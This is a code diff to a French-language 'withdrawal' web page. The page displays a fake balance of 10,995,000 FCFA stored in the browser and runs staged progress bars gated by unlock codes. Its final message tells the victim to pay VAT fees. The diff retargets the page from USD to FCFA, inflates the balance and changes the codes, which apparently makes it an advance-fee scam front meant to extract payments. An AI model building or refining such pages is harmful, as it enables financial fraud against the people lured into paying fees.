@@ -89,7 +89,7 @@
 <body>
     <div class="container">
         <h1>Retrait</h1>
-        <p>Solde : <strong id="solde-display">0 USD</strong></p>
+        <p>Solde : <strong id="solde-display">0 FCFA</strong></p>
         <form id="retrait-form">
             <input type="text" id="nom" placeholder="Noms et Prénoms" required>
             <input type="text" id="transaction" placeholder="Numéro de transaction" required>
@@ -111,7 +111,7 @@
 
     <script>
         // Initialisation du solde dans le localStorage pour la démonstration
-        const initialSolde = 350;
+        const initialSolde = 10995000;
         if (!localStorage.getItem('solde')) {
             localStorage.setItem('solde', initialSolde);
         }
@@ -133,7 +133,7 @@
         // Affiche le solde et remplit le champ montant
         function initializeSolde() {
             const solde = localStorage.getItem('solde');
-            soldeDisplay.textContent = `${solde} USD`;
+            soldeDisplay.textContent = `${solde} FCFA`;
             montantInput.value = solde;
         }
         initializeSolde();
@@ -160,7 +160,7 @@
                     clearInterval(interval);
                     alert(`Félicitations, Mme/M. ${nomInput.value}, votre retrait est terminé veillez payer les frais de TVA !`);
                 }
-            }, 10000); // Accéléré pour la démonstration
+            }, 15000); // Accéléré pour la démonstration
         }
 
         function updateProgress() {
@@ -175,11 +175,11 @@
 
         validateCode.addEventListener('click', () => {
             const code = codeInput.value.trim();
-            if (blockStep === 0 && code === '1234') {
+            if (blockStep === 0 && code === '12A34') {
                 blockStep = 1;
                 modal.style.display = 'none';
                 startProgress();
-            } else if (blockStep === 1 && code === '5678') {
+            } else if (blockStep === 1 && code === '56B78') {
                 blockStep = 2;
                 modal.style.display = 'none';
                 startProgress();
